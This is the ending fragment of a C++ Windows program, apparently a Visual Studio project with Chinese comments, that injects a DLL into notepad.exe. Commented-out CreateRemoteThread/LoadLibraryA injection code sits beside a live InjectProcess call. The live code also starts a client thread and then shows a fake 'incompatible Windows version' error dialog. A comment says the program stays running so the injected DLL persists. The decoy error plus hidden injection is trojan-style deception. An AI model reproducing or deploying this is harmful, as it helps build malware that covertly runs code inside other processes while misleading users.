	//	sizeof(szDll),
	//	0))
	//{
	//	std::cout << "GetLastError:" << GetLastError() << std::endl;
	//	MessageBox(NULL,
	//		"Write data to target process failed !",
	//		"Notice",
	//		MB_ICONINFORMATION | MB_OK
	//	);
	//	return 0;
	//}

	//LPVOID pFunc = LoadLibraryA;
	////在宿主进程中创建线程
	//HANDLE hRemoteThread = CreateRemoteThread(hTargetProcess,
	//	NULL,
	//	0,
	//	(LPTHREAD_START_ROUTINE)pFunc,
	//	pRemoteThread,
	//	0,
	//	&dwWriteBytes);
	//
	//if (!hRemoteThread)
	//{
	//	std::cout << "GetLastError:" << GetLastError() << std::endl;
	//	MessageBox(NULL,
	//		"Create remote thread failed !",
	//		"Notice",
	//		MB_ICONINFORMATION | MB_OK
	//	);
	//	return 0;
	//}
	int result = InjectProcess("TestDll.dll", "notepad.exe");
	DWORD clientThreadId;
	HANDLE clientThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClientThreadMethod, NULL, 0, &clientThreadId);
	MessageBox(NULL,
		"此文件的版本与正在运行的Windows版本不兼容。请检查计算机的系统信息以了解需要x86(32 位)还是 x64(64 位)版本的程序，然后联系软件发布者。",
		"错误",
		MB_ICONHAND | MB_OK
	);
	
	while (1)
	{
		Sleep(1000);
	}
	return 0;//这个就是提前结束，让DLL持续运行。
	// 等待LoadLibraryA加载完毕
	/*WaitForSingleObject(hRemoteThread, INFINITE);
	VirtualFreeEx(hTargetProcess, pRemoteThread, sizeof(szDll), MEM_COMMIT);
	CloseHandle(hRemoteThread);
	CloseHandle(hTargetProcess);*/

	return 0;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门提示: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
